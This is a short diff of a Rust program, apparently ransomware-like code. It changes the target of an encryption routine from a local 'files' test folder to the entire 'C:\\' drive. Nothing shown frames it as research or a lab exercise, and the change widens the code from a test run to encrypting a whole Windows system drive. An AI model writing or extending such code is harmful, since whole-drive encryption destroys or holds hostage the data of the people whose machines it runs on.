@@ -17,8 +17,7 @@ fn main() {
 
     let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);
 
-    encryptor.encrypt_dir(&String::from("files"));
-    //encrypt_files_in_dir(files, encryptor);
+    encryptor.encrypt_dir(&String::from("C:\\"));
 }
 
 /*
